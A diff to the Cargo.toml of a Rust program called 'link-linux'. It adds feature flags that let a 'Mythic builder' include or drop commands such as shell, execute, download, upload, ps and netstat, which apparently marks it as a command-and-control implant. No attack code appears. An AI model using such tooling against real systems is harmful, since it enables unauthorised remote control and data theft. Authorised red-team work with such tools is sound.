@@ -7,5 +7,28 @@ edition = "2021"
 name = "link-linux"
 path = "src/main.rs"
 
+[features]
+# Conditional command compilation (P5): every feature is on by default.
+# The Mythic builder disables individual commands via --no-default-features
+# --features cmd-... (see builder.go "commands" build parameter).
+default = [
+    "cmd-whoami",
+    "cmd-info",
+    "cmd-ps",
+    "cmd-netstat",
+    "cmd-shell",
+    "cmd-execute",
+    "cmd-download",
+    "cmd-upload",
+]
+cmd-whoami = []
+cmd-info = []
+cmd-ps = []
+cmd-netstat = []
+cmd-shell = []
+cmd-execute = ["link-common/cmd-execute"]
+cmd-download = ["link-common/cmd-download"]
+cmd-upload = ["link-common/cmd-upload"]
+
 [dependencies]
 link-common = { path = "../common" }
